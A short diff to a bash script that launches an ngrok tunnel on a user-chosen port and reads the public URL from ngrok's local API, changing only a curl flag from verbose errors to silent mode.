@@ -44,7 +44,7 @@ read -p $'   \e[1;34m[\e[1;32m*\e[1;34m]\e[1;33m Enter Port Number \e[1;34m: \e[
 echo
 ./ngrok http $port >  /dev/null 2>&1 &
 sleep 6 
-link=$(curl -S -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+link=$(curl -s -N  http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io") 
 function link_err(){
 if [ $link == ""];
 then
